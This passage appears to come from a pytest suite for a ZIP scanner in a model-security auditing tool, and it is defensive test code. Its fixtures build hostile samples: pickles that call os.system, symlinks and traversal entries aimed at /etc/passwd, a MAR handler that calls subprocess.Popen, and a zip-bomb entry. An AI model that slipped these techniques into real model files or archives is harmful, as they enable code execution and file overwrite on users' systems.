    result = ZipScanner({"skip_archive_entries": ["weights_link"], "cache_enabled": False}).scan(str(archive_path))

    assert any(
        check.name == "Symlink Safety Validation"
        and check.status == CheckStatus.FAILED
        and check.details["entry"] == "weights_link"
        for check in result.checks
    )


def test_zip_scanner_does_not_reopen_known_unreadable_symlink(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    archive_path = tmp_path / "unreadable-symlink.zip"
    with zipfile.ZipFile(archive_path, "w") as archive:
        info = zipfile.ZipInfo("symlink.txt")
        info.create_system = 3
        info.external_attr = (stat.S_IFLNK | 0o777) << 16
        archive.writestr(info, "safe-target.bin")

    with zipfile.ZipFile(archive_path) as archive:
        unreadable_offset = archive.getinfo("symlink.txt").header_offset

    def fail_read(_archive: zipfile.ZipFile, _info: zipfile.ZipInfo) -> str:
        raise AssertionError("known unreadable symlink target should not be reopened")

    monkeypatch.setattr(ZipScanner, "_read_symlink_target", fail_read)

    set_config(ModelAuditConfig(severity={"S406": Severity.CRITICAL}))
    try:
        result = ZipScanner(
            {
                KNOWN_UNREADABLE_ARCHIVE_ENTRY_OFFSETS_CONFIG_KEY: [unreadable_offset],
                "cache_enabled": False,
            }
        ).scan(str(archive_path))
    finally:
        reset_config()

    assert result.success is False
    assert "zip_analysis_incomplete" in result.metadata["scan_outcome_reasons"]
    assert not any(check.name == "Symlink Safety Validation" for check in result.checks)
    coverage_checks = [
        check
        for check in result.checks
        if check.name == "ZIP Member Analysis Coverage" and check.status == CheckStatus.FAILED
    ]
    assert len(coverage_checks) == 1
    assert coverage_checks[0].details["entry"] == "symlink.txt"
    assert coverage_checks[0].rule_code == "S902"
    assert coverage_checks[0].severity == IssueSeverity.INFO
    assert not any(check.rule_code == "S406" for check in result.checks)


def test_zip_scanner_configured_skip_name_cannot_inherit_symlink_severity_override(tmp_path: Path) -> None:
    archive_path = tmp_path / "configured-skipped-symlink-name.zip"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("symlink.txt", b"ordinary bytes")

    set_config(ModelAuditConfig(severity={"S406": Severity.CRITICAL}))
    try:
        result = ZipScanner({"skip_archive_entries": ["symlink.txt"], "cache_enabled": False}).scan(str(archive_path))
    finally:
        reset_config()

    coverage_checks = [
        check
        for check in result.checks
        if check.name == "ZIP Member Analysis Coverage"
        and check.status == CheckStatus.FAILED
        and check.details["entry"] == "symlink.txt"
    ]
    assert len(coverage_checks) == 1
    assert coverage_checks[0].rule_code == "S902"
    assert coverage_checks[0].severity == IssueSeverity.INFO
    assert not any(check.rule_code == "S406" for check in result.checks)


def test_zip_scanner_validates_traversal_before_known_unreadable_symlink_skip(tmp_path: Path) -> None:
    archive_path = tmp_path / "unreadable-traversal-symlink.zip"
    with zipfile.ZipFile(archive_path, "w") as archive:
        info = zipfile.ZipInfo("../weights_link")
        info.create_system = 3
        info.external_attr = (stat.S_IFLNK | 0o777) << 16
        archive.writestr(info, "safe-target.bin")

    with zipfile.ZipFile(archive_path) as archive:
        unreadable_offset = archive.getinfo("../weights_link").header_offset

    result = ZipScanner(
        {
            KNOWN_UNREADABLE_ARCHIVE_ENTRY_OFFSETS_CONFIG_KEY: [unreadable_offset],
            "cache_enabled": False,
        }
    ).scan(str(archive_path))

    assert any(
        check.name == "Path Traversal Protection"
        and check.status == CheckStatus.FAILED
        and check.details["entry"] == "../weights_link"
        for check in result.checks
    )


def test_scan_zip_fails_closed_when_nested_recognized_header_scanner_is_unavailable(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    archive_path = tmp_path / "bundle.zip"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("member.dat", b"header-routed model payload")

    monkeypatch.setattr(archive_dispatch, "detect_file_format", lambda _path: "header_only_model")
    monkeypatch.setattr(archive_dispatch, "detect_file_format_from_magic", lambda _path: "header_only_model")
    monkeypatch.setitem(
        archive_dispatch._HEADER_FORMAT_TO_SCANNER_ID,
        "header_only_model",
        "header_only_scanner",
    )
    monkeypatch.setattr(_registry, "load_scanner_by_id", lambda _scanner_id: None)
    monkeypatch.setattr(_registry, "get_scanner_for_path", lambda _path: None)

    result = ZipScanner({"cache_enabled": False}).scan(str(archive_path))

    assert result.success is False
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "zip_analysis_incomplete" in result.metadata["scan_outcome_reasons"]
    nested_check = next(check for check in result.checks if check.name == "Format Detection")
    assert nested_check.location == f"{archive_path}:member.dat"


def test_scan_zip_preserves_findings_when_nested_keras_scanner_is_unavailable(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    nested_keras = io.BytesIO()
    with zipfile.ZipFile(nested_keras, "w") as archive:
        archive.writestr("config.json", json.dumps({"class_name": "Sequential", "config": {"layers": []}}))
        archive.writestr("metadata.json", json.dumps({"keras_version": "3.0.0"}))
        archive.writestr("payload.pkl", b'cos\nsystem\n(S"echo pwned"\ntR.')

    archive_path = tmp_path / "bundle.zip"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("nested.keras", nested_keras.getvalue())

    original_load_scanner = _registry._load_scanner

    def load_scanner(scanner_id: str) -> type[BaseScanner] | None:
        if scanner_id == "keras_zip":
            return None
        return original_load_scanner(scanner_id)

    monkeypatch.setattr(_registry, "_load_scanner", load_scanner)

    result = ZipScanner({"cache_enabled": False}).scan(str(archive_path))

    assert result.success is False
    assert "zip_analysis_incomplete" in result.metadata["scan_outcome_reasons"]
    nested_check = next(check for check in result.checks if check.name == "Format Detection")
    assert nested_check.location == f"{archive_path}:nested.keras"
    assert nested_check.details["preferred_scanner_id"] == "keras_zip"
    assert any(
        issue.rule_code == "S201"
        and issue.location == f"{archive_path}:nested.keras:payload.pkl"
        and issue.details.get("zip_entry") == "nested.keras:payload.pkl"
        for issue in result.issues
    )


class TestZipScanner:
    """Test the ZIP scanner"""

    def setup_method(self):
        """Set up test fixtures"""
        self.scanner = ZipScanner()

    def test_logical_archive_entry_name_preserves_windows_separator_spelling(self) -> None:
        info = zipfile.ZipInfo("docs/LICENSE")
        info.orig_filename = r"docs\LICENSE"

        assert ZipScanner._logical_archive_entry_name(info) == r"docs\LICENSE"

    def test_logical_archive_entry_name_does_not_restore_sanitized_nul_suffix(self) -> None:
        info = zipfile.ZipInfo("LICENSE")
        info.orig_filename = "LICENSE\0payload.pkl"

        assert ZipScanner._logical_archive_entry_name(info) == "LICENSE"

    def test_can_handle_zip_files(self):
        """Test that the scanner correctly identifies ZIP files"""
        # Create a temporary zip file
        with tempfile.NamedTemporaryFile(suffix=".zip", delete=False) as tmp:
            with zipfile.ZipFile(tmp.name, "w") as z:
                z.writestr("test.txt", "Hello World")
            tmp_path = tmp.name

        try:
            assert ZipScanner.can_handle(tmp_path) is True
            assert ZipScanner.can_handle("/path/to/file.txt") is False
            assert ZipScanner.can_handle("/path/to/file.pkl") is False
        finally:
            os.unlink(tmp_path)

    def test_can_handle_does_not_materialize_central_directory(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        archive_path = tmp_path / "routed.zip"
        with zipfile.ZipFile(archive_path, "w") as archive:
            archive.writestr("one.txt", "one")
            archive.writestr("two.txt", "two")

        def fail_zipfile_open(*_args: Any, **_kwargs: Any) -> Any:
            raise AssertionError("can_handle must not parse the central directory")

        monkeypatch.setattr(zip_scanner_module.zipfile, "ZipFile", fail_zipfile_open)

        assert ZipScanner.can_handle(str(archive_path)) is True

    def test_can_handle_does_not_claim_stray_local_header_bytes(self, tmp_path: Path) -> None:
        model_path = tmp_path / "weights.bin"
        model_path.write_bytes(b"model metadata PK\x03\x04 embedded tensor bytes")

        assert ZipScanner.can_handle(str(model_path)) is False

    def test_symlink_outside_extraction_root(self):
        """Symlinks resolving outside the extraction root should be flagged."""
        with tempfile.NamedTemporaryFile(suffix=".zip", delete=False) as tmp:
            with zipfile.ZipFile(tmp.name, "w") as z:
                import stat

                info = zipfile.ZipInfo("link.txt")
                info.create_system = 3
                info.external_attr = (stat.S_IFLNK | 0o777) << 16
                z.writestr(info, "../evil.txt")
            tmp_path = tmp.name

        try:
            result = self.scanner.scan(tmp_path)
            symlink_issues = [i for i in result.issues if "symlink" in i.message.lower()]
            assert any("outside" in i.message.lower() for i in symlink_issues)
        finally:
            os.unlink(tmp_path)

    def test_symlink_to_critical_path(self):
        """Symlinks targeting critical system paths should be flagged."""
        with tempfile.NamedTemporaryFile(suffix=".zip", delete=False) as tmp:
            with zipfile.ZipFile(tmp.name, "w") as z:
                import stat

                info = zipfile.ZipInfo("etc_passwd")
                info.create_system = 3
                info.external_attr = (stat.S_IFLNK | 0o777) << 16
                z.writestr(info, "/etc/passwd")
            tmp_path = tmp.name

        try:
            result = self.scanner.scan(tmp_path)
            symlink_issues = [i for i in result.issues if "symlink" in i.message.lower()]
            assert any("critical system" in i.message.lower() for i in symlink_issues)
        finally:
            os.unlink(tmp_path)

    def test_dos_entry_with_unix_symlink_bits_is_scanned_as_regular_file(self, tmp_path: Path) -> None:
        archive_path = tmp_path / "fake-symlink.zip"
        with zipfile.ZipFile(archive_path, "w") as archive:
            info = zipfile.ZipInfo("payload.pkl")
            info.create_system = 0
            info.external_attr = (stat.S_IFLNK | 0o777) << 16
            archive.writestr(info, b'cos\nsystem\n(S"echo replacement"\ntR.')

        result = self.scanner.scan(str(archive_path))

        assert any(issue.rule_code == "S201" for issue in result.issues)
        assert not any(check.name == "Symlink Safety Validation" for check in result.checks)

    def test_nested_symlink_target_within_archive_root_is_safe(self, tmp_path: Path) -> None:
        archive_path = tmp_path / "nested-safe-symlink.zip"
        with zipfile.ZipFile(archive_path, "w") as archive:
            archive.writestr("target.txt", "safe")
            info = zipfile.ZipInfo("dir/link")
            info.create_system = 3
            info.external_attr = (stat.S_IFLNK | 0o777) << 16
            archive.writestr(info, "../target.txt")

        result = self.scanner.scan(str(archive_path))

        assert any(
            check.name == "Symlink Safety Validation"
            and check.status == CheckStatus.PASSED
            and check.details.get("entry") == "dir/link"
            for check in result.checks
        )
        assert not any(issue.rule_code == "S406" for issue in result.issues)

    def test_nested_symlink_target_outside_archive_root_is_rejected(self, tmp_path: Path) -> None:
        archive_path = tmp_path / "nested-unsafe-symlink.zip"
        with zipfile.ZipFile(archive_path, "w") as archive:
            info = zipfile.ZipInfo("dir/link")
            info.create_system = 3
            info.external_attr = (stat.S_IFLNK | 0o777) << 16
            archive.writestr(info, "../../evil.txt")

        result = self.scanner.scan(str(archive_path))

        assert any(issue.rule_code == "S406" and issue.details.get("entry") == "dir/link" for issue in result.issues)

    def test_duplicate_symlink_names_validate_current_entry_target(self, tmp_path: Path) -> None:
        """Duplicate symlink entries should validate each ZipInfo target, not the last name alias."""
        import stat

        archive_path = tmp_path / "duplicate_symlink.zip"
        with zipfile.ZipFile(archive_path, "w") as zf:
            first_info = zipfile.ZipInfo("link.txt")
            first_info.create_system = 3
            first_info.external_attr = (stat.S_IFLNK | 0o777) << 16
            zf.writestr(first_info, "/etc/passwd")

            second_info = zipfile.ZipInfo("link.txt")
            second_info.create_system = 3
            second_info.external_attr = (stat.S_IFLNK | 0o777) << 16
            zf.writestr(second_info, "safe-target.txt")

        result = self.scanner.scan(str(archive_path))

        failed_symlink_checks = [
            check
            for check in result.checks
            if check.name == "Symlink Safety Validation" and check.status == CheckStatus.FAILED
        ]
        assert len(failed_symlink_checks) == 1
        assert failed_symlink_checks[0].details == {
            "entry": "link.txt",
            "target": "/etc/passwd",
        }
        assert any(
            issue.rule_code == "S406"
            and issue.details.get("entry") == "link.txt"
            and issue.details.get("target") == "/etc/passwd"
            and "critical system path" in issue.message.lower()
            for issue in result.issues
        )

    def test_zip_bytes_scanned_single_count(self):
        """Ensure bytes scanned equals the sum of embedded files once."""
        with tempfile.NamedTemporaryFile(suffix=".zip", delete=False) as tmp:
            with zipfile.ZipFile(tmp.name, "w") as z:
                import pickle

                data1 = pickle.dumps({"a": 1})
                data2 = pickle.dumps({"b": 2})
                z.writestr("one.pkl", data1)
                z.writestr("two.pkl", data2)
            tmp_path = tmp.name

        try:
            result = self.scanner.scan(tmp_path)
            assert result.success is True
            expected = len(data1) + len(data2)
            assert result.bytes_scanned == expected
        finally:
            os.unlink(tmp_path)

    def test_scan_simple_zip(self):
        """Test scanning a simple ZIP file with text files"""
        with tempfile.NamedTemporaryFile(suffix=".zip", delete=False) as tmp:
            with zipfile.ZipFile(tmp.name, "w") as z:
                z.writestr("readme.txt", "This is a readme file")
                z.writestr("data.json", '{"key": "value"}')
            tmp_path = tmp.name

        try:
            result = self.scanner.scan(tmp_path)
            assert result.success is True
            assert result.bytes_scanned > 0
            # May have some debug/info issues about unknown formats
            error_issues = [i for i in result.issues if i.severity == IssueSeverity.CRITICAL]
            assert len(error_issues) == 0
        finally:
            os.unlink(tmp_path)

    def test_scan_zip_with_pickle(self):
        """Test scanning a ZIP file containing a pickle file"""
        with tempfile.NamedTemporaryFile(suffix=".zip", delete=False) as tmp:
            with zipfile.ZipFile(tmp.name, "w") as z:
                # Create a simple pickle file
                import pickle

                pickle_data = pickle.dumps({"safe": "data"})
                z.writestr("model.pkl", pickle_data)
            tmp_path = tmp.name

        try:
            result = self.scanner.scan(tmp_path)
            assert result.success is True
            assert result.bytes_scanned > 0
            # The pickle scanner was run on the embedded file
            # Check that we scanned the pickle data
            assert result.bytes_scanned >= len(pickle_data)
        finally:
            os.unlink(tmp_path)

    def test_scan_nested_zip(self):
        """Test scanning nested ZIP files"""
        # Create inner zip
        with tempfile.NamedTemporaryFile(suffix=".zip", delete=False) as inner_tmp:
            with zipfile.ZipFile(inner_tmp.name, "w") as inner_z:
                inner_z.writestr("inner.txt", "Inner file content")
            inner_path = inner_tmp.name

        try:
            # Create outer zip containing inner zip
            with tempfile.NamedTemporaryFile(suffix=".zip", delete=False) as outer_tmp:
                with zipfile.ZipFile(outer_tmp.name, "w") as outer_z:
                    outer_z.write(inner_path, "nested.zip")
                outer_path = outer_tmp.name

            result = self.scanner.scan(outer_path)
            assert result.success is True
            # Should have scanned the nested content
            assert (
                any("nested.zip" in str(issue.location) for issue in result.issues if hasattr(issue, "location"))
                or result.bytes_scanned > 0
            )
        finally:
            os.unlink(inner_path)
            os.unlink(outer_path)

    def test_scan_alternating_zip_tar_enforces_shared_depth_limit(self, tmp_path: Path) -> None:
        """Archive depth should not reset when recursion alternates between ZIP and TAR."""
        inner_zip = tmp_path / "inner.zip"
        with zipfile.ZipFile(inner_zip, "w") as archive:
            archive.writestr("payload.txt", "deep content")

        middle_tar = tmp_path / "middle.tar"
        with tarfile.open(middle_tar, "w") as archive:
            archive.add(inner_zip, arcname="inner.zip")

        outer_zip = tmp_path / "outer.zip"
        with zipfile.ZipFile(outer_zip, "w") as archive:
            archive.write(middle_tar, arcname="middle.tar")

        scanner = ZipScanner(config={"max_zip_depth": 2, "max_tar_depth": 2})
        result = scanner.scan(str(outer_zip))

        depth_checks = [
            check
            for check in result.checks
            if check.name == "ZIP Depth Bomb Protection" and check.status == CheckStatus.FAILED
        ]
        assert len(depth_checks) == 1
        assert "maximum zip nesting depth (2) exceeded" in depth_checks[0].message.lower()
        assert depth_checks[0].location == f"{outer_zip}:middle.tar:inner.zip"
        assert depth_checks[0].severity == IssueSeverity.WARNING
        assert depth_checks[0].rule_code == "S410"
        assert "zip_depth_limit" in result.metadata["scan_outcome_reasons"]

    def test_scan_nested_mar_enforces_shared_depth_limit(self, tmp_path: Path) -> None:
        """Archive depth should not reset when ZIP recursion enters TorchServe MAR files."""
        nested_mar = tmp_path / "model.mar"
        with zipfile.ZipFile(nested_mar, "w") as archive:
            archive.writestr(
                "MAR-INF/MANIFEST.json",
                '{"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}',
            )
            archive.writestr("handler.py", "def handle(data, context):\n    return data\n")
            archive.writestr("weights.bin", "weights")

        outer_zip = tmp_path / "outer.zip"
        with zipfile.ZipFile(outer_zip, "w") as archive:
            archive.write(nested_mar, arcname="model.mar")

        scanner = ZipScanner(config={"max_mar_depth": 1})
        result = scanner.scan(str(outer_zip))

        depth_checks = [
            check
            for check in result.checks
            if check.name == "TorchServe MAR Depth Limit" and check.status == CheckStatus.FAILED
        ]
        assert len(depth_checks) == 1
        assert "maximum .mar recursion depth (1) exceeded" in depth_checks[0].message.lower()
        assert depth_checks[0].location == f"{outer_zip}:model.mar"

    def test_scan_manifestless_mar_runs_python_handler_static_analysis(self, tmp_path: Path) -> None:
        """Manifest-less .mar archives should still statically analyze Python handlers."""
        mar_path = tmp_path / "handler_only.mar"
        with zipfile.ZipFile(mar_path, "w") as archive:
            archive.writestr(
                "handler.py",
                "import subprocess\nsubprocess.Popen(['echo', 'pwned'])\n",
            )

        result = self.scanner.scan(str(mar_path))

        assert result.success is False
        assert result.has_errors is True

        handler_failures = [
            check
            for check in result.checks
            if check.name == "TorchServe Handler Static Analysis" and check.status == CheckStatus.FAILED
        ]
        assert len(handler_failures) == 1
        assert "high-risk execution primitives" in handler_failures[0].message.lower()
        assert handler_failures[0].details.get("entry") == "handler.py"
        assert handler_failures[0].details.get("risky_calls") == ["subprocess.Popen"]
        assert handler_failures[0].location == f"{mar_path}:handler.py"

    def test_scan_manifestless_mar_skips_oversized_python_handler_analysis(self, tmp_path: Path) -> None:
        """Oversized .mar Python handlers should report skipped bounded analysis."""
        mar_path = tmp_path / "oversized_handler.mar"
        oversized_handler_source = "print('x')\n" * 100
        with zipfile.ZipFile(mar_path, "w") as archive:
            archive.writestr("handler.py", oversized_handler_source)

        scanner = ZipScanner(config={"max_mar_python_analysis_bytes": 16})
        result = scanner.scan(str(mar_path))

        handler_failures = [
            check
            for check in result.checks
            if check.name == "TorchServe Handler Static Analysis" and check.status == CheckStatus.FAILED
        ]
        assert len(handler_failures) == 1
        assert handler_failures[0].severity == IssueSeverity.INFO
        assert "oversized entry" in handler_failures[0].message.lower()
        assert "limit is 16 bytes" in handler_failures[0].message.lower()
        assert handler_failures[0].details.get("entry") == "handler.py"
        assert handler_failures[0].details.get("size_limit") == 16
        assert handler_failures[0].location == f"{mar_path}:handler.py"
        assert "torchserve_handler_size_limit" in result.metadata["scan_outcome_reasons"]
        _assert_inconclusive_zip_scan_not_cached(
            mar_path,
            "torchserve_handler_size_limit",
            tmp_path / "oversized-handler-cache",
            max_mar_python_analysis_bytes=16,
        )

    def test_scan_manifestless_mar_reports_malformed_python_handler(self, tmp_path: Path) -> None:
        """Manifest-less .mar handlers with invalid syntax should emit parse-error analysis checks."""
        mar_path = tmp_path / "malformed_handler.mar"
        with zipfile.ZipFile(mar_path, "w") as archive:
            archive.writestr("handler.py", "def handle(data, context)\n    return data\n")

        result = self.scanner.scan(str(mar_path))
        assert result.success is False
        assert result.has_warnings is False
        assert result.has_errors is False

        handler_failures = [
            check
            for check in result.checks
            if check.name == "TorchServe Handler Static Analysis" and check.status == CheckStatus.FAILED
        ]
        assert len(handler_failures) == 1
        assert handler_failures[0].severity == IssueSeverity.INFO
        assert "unable to parse python entry for static analysis" in handler_failures[0].message.lower()
        assert handler_failures[0].details.get("entry") == "handler.py"
        assert handler_failures[0].details.get("analysis_kind") == "syntax"
        assert "expected ':'" in str(handler_failures[0].details.get("parse_error")).lower()
        assert handler_failures[0].location == f"{mar_path}:handler.py"
        assert "torchserve_handler_parse_failed" in result.metadata["scan_outcome_reasons"]
        _assert_inconclusive_zip_scan_not_cached(
            mar_path,
            "torchserve_handler_parse_failed",
            tmp_path / "malformed-handler-cache",
        )

    def test_scan_manifestless_mar_unreadable_python_handler_is_inconclusive(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """Unavailable fallback handler bytes should not be reported as malicious content."""
        mar_path = tmp_path / "unreadable_handler.mar"
        with zipfile.ZipFile(mar_path, "w") as archive:
            archive.writestr("handler.py", "def handle(data, context):\n    return data\n")

        real_open = open

        def fail_handler_read(path: str, mode: str = "r", *args: Any, **kwargs: Any) -> Any:
            if mode == "rb" and path.endswith("_handler.py"):
                raise OSError("simulated fallback handler read failure")
            return real_open(path, mode, *args, **kwargs)

        monkeypatch.setattr(zip_scanner_module, "open", fail_handler_read, raising=False)

        result = self.scanner.scan(str(mar_path))
        handler_failures = [
            check
            for check in result.checks
            if check.name == "TorchServe Handler Static Analysis" and check.status == CheckStatus.FAILED
        ]
        assert len(handler_failures) == 1
        assert handler_failures[0].severity == IssueSeverity.INFO
        assert "torchserve_handler_read_failed" in result.metadata["scan_outcome_reasons"]
        _assert_inconclusive_zip_scan_not_cached(
            mar_path,
            "torchserve_handler_read_failed",
            tmp_path / "unreadable-handler-cache",
        )

    def test_scan_extensionless_nested_zip_recurses(self, tmp_path: Path) -> None:
        """Extensionless ZIP members should be recursively scanned by content."""
        inner_zip = io.BytesIO()
        with zipfile.ZipFile(inner_zip, "w") as inner_archive:
            inner_archive.writestr("payload.pkl", b'cos\nsystem\n(S"echo pwned"\ntR.')

        archive_path = tmp_path / "outer.zip"
        with zipfile.ZipFile(archive_path, "w") as outer_archive:
            outer_archive.writestr("nested", inner_zip.getvalue())

        result = self.scanner.scan(str(archive_path))

        assert result.success is False
        assert result.has_errors is True
        assert any(
            check.details.get("zip_entry") == "nested:payload.pkl"
            and check.location == f"{archive_path}:nested:payload.pkl"
            for check in result.checks
        ), f"Expected nested extensionless ZIP checks, got: {[(c.location, c.details) for c in result.checks]}"
        assert any(
            issue.severity == IssueSeverity.CRITICAL
            and issue.details.get("zip_entry") == "nested:payload.pkl"
            and issue.location == f"{archive_path}:nested:payload.pkl"
            and ("os.system" in issue.message.lower() or "posix.system" in issue.message.lower())
            for issue in result.issues
        ), (
            "Expected critical nested pickle finding, got: "
            f"{[(i.location, i.message, i.details) for i in result.issues]}"
        )

    def test_scan_extensionless_nested_gzip_recurses_by_header(self, tmp_path: Path) -> None:
        """Extensionless gzip members should route through CompressedScanner by header."""
        archive_path = tmp_path / "outer.zip"
        payload = b'cos\nsystem\n(S"echo zipped gzip payload"\ntR.'
        with zipfile.ZipFile(archive_path, "w") as archive:
            archive.writestr("compressed_payload", gzip.compress(payload))

        result = self.scanner.scan(str(archive_path))

        assert result.success is False
        assert result.has_errors is True
        routing_checks = [check for check in result.checks if check.name == "Compressed Wrapper Inner Scanner Routing"]
        assert any(
            check.details.get("inner_scanner") == "pickle" and check.details.get("zip_entry") == "compressed_payload"
            for check in routing_checks
        ), f"Expected compressed nested routing check, got: {[(c.location, c.details) for c in routing_checks]}"
        assert any(
            issue.severity == IssueSeverity.CRITICAL
            and issue.details.get("zip_entry") == "compressed_payload"
            and ("os.system" in issue.message.lower() or "posix.system" in issue.message.lower())
            for issue in result.issues
        ), (
            "Expected critical nested compressed pickle finding, got: "
            f"{[(i.location, i.message, i.details) for i in result.issues]}"
        )

    def test_scan_extensionless_nested_gzip_benign_text_does_not_route_to_pickle(self, tmp_path: Path) -> None:
        """Extensionless gzip text should not be treated as a nested pickle just because it is compressed."""
        archive_path = tmp_path / "outer-benign.zip"
        with zipfile.ZipFile(archive_path, "w") as archive:
            archive.writestr("compressed_payload", gzip.compress(b"just some harmless text\n"))

        result = self.scanner.scan(str(archive_path))

        routing_checks = [
            check
            for check in result.checks
            if check.name == "Compressed Wrapper Inner Scanner Routing"
            and check.details.get("zip_entry") == "compressed_payload"
        ]
        assert not any(check.details.get("inner_scanner") == "pickle" for check in routing_checks), (
            "Expected benign gzip text to avoid pickle routing, got: "
            f"{[(check.location, check.details) for check in routing_checks]}"
        )
        assert not [
            issue
            for issue in result.issues
            if issue.severity == IssueSeverity.CRITICAL and issue.details.get("zip_entry") == "compressed_payload"
        ]

    def test_nested_keras_member_routes_through_nested_scan_callback(self, tmp_path: Path) -> None:
        """Nested ZIP-based members should preserve ZIP depth and use the injected callback."""
        nested_keras = io.BytesIO()
        with zipfile.ZipFile(nested_keras, "w"):
            pass

        archive_path = tmp_path / "outer.zip"
        with zipfile.ZipFile(archive_path, "w") as outer_archive:
            outer_archive.writestr("nested_model.keras", nested_keras.getvalue())

        dispatched_result = ScanResult(scanner_name="keras_zip")
        dispatched_result.metadata["file_size"] = len(nested_keras.getvalue())
        dispatched_result.finish(success=True)

        callback_calls: list[tuple[str, dict[str, Any] | None]] = []

        def scan_nested_member(path: str, config: dict[str, Any] | None = None) -> ScanResult:
            callback_calls.append((path, config))
            return dispatched_result

        scanner = ZipScanner(config={NESTED_SCAN_CALLBACK_CONFIG_KEY: scan_nested_member})
        result = scanner.scan(str(archive_path))

        assert result.success is True
        assert len(callback_calls) == 1

        scan_path, scan_config = callback_calls[0]
        assert scan_path.endswith(".keras")
        assert scan_config is not None
        assert scan_config["_zip_depth"] == 1

        assert result.metadata["contents"] == [
            {
                "path": f"{archive_path}:nested_model.keras",
                "type": "keras_zip",
                "size": len(nested_keras.getvalue()),
            }
        ]

    def test_max_depth_limit_on_extensionless_nested_zip_chain(self, tmp_path: Path) -> None:
        """Extensionless nested ZIP chains should still honor max_zip_depth."""
        nested_zip_bytes = io.BytesIO()
        with zipfile.ZipFile(nested_zip_bytes, "w") as nested_archive:
            nested_archive.writestr("payload.pkl", b'cos\nsystem\n(S"echo pwned"\ntR.')

        for entry_name in ("level2", "level1", "level0"):
            parent_zip_bytes = io.BytesIO()
            with zipfile.ZipFile(parent_zip_bytes, "w") as parent_archive:
                parent_archive.writestr(entry_name, nested_zip_bytes.getvalue())
            nested_zip_bytes = parent_zip_bytes

        archive_path = tmp_path / "outer.zip"
        archive_path.write_bytes(nested_zip_bytes.getvalue())

        result = ZipScanner(config={"max_zip_depth": 2}).scan(str(archive_path))

        assert result.success is False
        assert any(
            issue.message == "Maximum ZIP nesting depth (2) exceeded"
            and issue.severity == IssueSeverity.WARNING
            and issue.rule_code == "S410"
            and issue.location == f"{archive_path}:level0:level1"
            and issue.details.get("zip_entry") == "level0:level1"
            and issue.details.get("depth") == 2
            and issue.details.get("max_depth") == 2
            for issue in result.issues
        ), f"Expected extensionless depth issue, got: {[(i.location, i.message, i.details) for i in result.issues]}"
        assert not any(
            issue.severity == IssueSeverity.CRITICAL
            and ("os.system" in issue.message.lower() or "posix.system" in issue.message.lower())
            for issue in result.issues
        ), f"Depth limit should stop payload scan, got: {[(i.location, i.message) for i in result.issues]}"
        assert "zip_depth_limit" in result.metadata["scan_outcome_reasons"]
        _assert_inconclusive_zip_aggregate_not_cached(
            archive_path,
            "zip_depth_limit",
            tmp_path / "depth-limit-cache",
            expected_exit_code=1,
            expected_security_findings=True,
            max_zip_depth=2,
        )

    def test_directory_traversal_detection(self):
        """Test detection of directory traversal attempts in ZIP files"""
        with tempfile.NamedTemporaryFile(suffix=".zip", delete=False) as tmp:
            with zipfile.ZipFile(tmp.name, "w") as z:
                # Create entries with directory traversal attempts
                z.writestr("../../../etc/passwd", "malicious content")
                z.writestr("/etc/passwd", "malicious content")
                z.writestr("safe.txt", "safe content")
            tmp_path = tmp.name

        try:
            result = self.scanner.scan(tmp_path)
            assert result.success is False

            # Should have detected directory traversal attempts
            traversal_issues = [
                i
                for i in result.issues
                if "path traversal" in i.message.lower() or "directory traversal" in i.message.lower()
            ]
            assert len(traversal_issues) >= 2

            # Check severity
            for issue in traversal_issues:
                assert issue.severity == IssueSeverity.CRITICAL
        finally:
            os.unlink(tmp_path)

    def test_windows_traversal_detection(self):
        """Ensure Windows-style path traversal is caught"""
        with tempfile.NamedTemporaryFile(suffix=".zip", delete=False) as tmp:
            with zipfile.ZipFile(tmp.name, "w") as z:
                z.writestr("..\\evil.txt", "malicious")
                z.writestr("safe.txt", "ok")
            tmp_path = tmp.name

        try:
            result = self.scanner.scan(tmp_path)
            traversal_issues = [i for i in result.issues if "path traversal" in i.message.lower()]
            assert len(traversal_issues) >= 1
            for issue in traversal_issues:
                assert issue.severity == IssueSeverity.CRITICAL
        finally:
            os.unlink(tmp_path)

    def test_zip_bomb_detection(self, tmp_path: Path) -> None:
        """High compression-ratio entries should be reported without extracting them."""
        archive_path = tmp_path / "suspicious.zip"
        with zipfile.ZipFile(archive_path, "w", compression=zipfile.ZIP_DEFLATED) as z:
            z.writestr("suspicious.txt", "A" * (2 * 1024 * 1024))

        nested_scan_paths: list[str] = []

        def nested_scan(path: str, _config: dict[str, Any]) -> ScanResult:
            nested_scan_paths.append(path)
            return ScanResult(scanner_name="test")

        scanner = ZipScanner(config={NESTED_SCAN_CALLBACK_CONFIG_KEY: nested_scan})
        result = scanner.scan(str(archive_path))

        assert result.success is False
        assert nested_scan_paths == []

        compression_issues = [i for i in result.issues if "compression ratio" in i.message.lower()]
        assert len(compression_issues) == 1
        assert compression_issues[0].rule_code == "S410"
        assert compression_issues[0].details["entry"] == "suspicious.txt"
        assert "skipping extraction" in compression_issues[0].message

    def test_small_high_compression_ratio_entry_stays_clean(self, tmp_path: Path) -> None:
        """Small repetitive metadata should not be treated as a ZIP bomb."""
        archive_path = tmp_path / "metadata.zip"
        with zipfile.ZipFile(archive_path, "w", compression=zipfile.ZIP_DEFLATED) as z:
            z.writestr("metadata.txt", "A" * 16384)

        nested_scan_paths: list[str] = []

        def nested_scan(path: str, _config: dict[str, Any]) -> ScanResult:
            nested_scan_paths.append(path)
            return ScanResult(scanner_name="test")

        scanner = ZipScanner(config={NESTED_SCAN_CALLBACK_CONFIG_KEY: nested_scan})
        result = scanner.scan(str(archive_path))

        assert result.success is True
        assert any(path.endswith("_metadata.txt") for path in nested_scan_paths)
        assert not [issue for issue in result.issues if issue.rule_code == "S410"]
        compression_checks = [
            check
            for check in result.checks
            if check.name == "Compression Ratio Check" and check.details.get("entry") == "metadata.txt"
        ]
        assert len(compression_checks) == 1
        assert compression_checks[0].status == CheckStatus.PASSED
        assert "size floor" in compression_checks[0].message
